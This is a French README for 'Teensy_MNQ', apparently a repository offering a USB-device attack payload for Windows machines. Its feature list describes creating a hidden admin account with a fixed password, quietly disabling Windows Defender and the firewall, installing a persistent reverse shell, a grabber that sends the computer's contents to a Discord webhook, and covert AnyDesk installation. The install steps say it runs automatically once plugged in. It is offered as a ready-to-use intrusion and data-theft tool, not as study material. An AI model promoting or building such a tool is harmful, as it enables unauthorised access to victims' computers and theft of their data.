**Teensy_MNQ**

Ce repository contient un programme pour la Teensy ainsi que des configurations et des instructions d'installation pour la manipulation de la carte SD.

**Fonctionnalités**

- 🔐 Création d'un compte admin avec configuration du mot de passe (NagibAdmin, mot de passe : 12301230)
- 🛡️ Désactivation discrète et pas à pas de Windows Defender et du Firewall
- 🔍 Recherche automatique du port auquel l'ordinateur est connecté à la Teensy et retour de force pour la communication bidirectionnelle avec la Teensy
- ⏳ Persistance : si l'utilisateur n'est pas créé, un délai est ajouté et l'installation reprend depuis le début (rapide)
- 🔄 Installation d'un reverse shell avec persistance au démarrage
- 🎣 Installation d'un grabber envoyant tout ce qui est contenu dans le PC vers un webhook Discord
- 🖥️ Installation de AnyDesk et récupération de l'ID

**Installation**

1. Cloner ce repository sur votre ordinateur :

    ```
    git clone https://github.com/Naywvi/Teensy_MNQ.git
    ```

2. Copier-coller le code du fichier .ino dans l'IDE Arduino et téléverser sur la Teensy.
3. Copier tout le contenu du dossier `Teensy_SD_CARD` sur la carte SD de la Teensy.

C'est tout ! Le programme s'exécutera automatiquement une fois que la Teensy est connectée à un ordinateur.
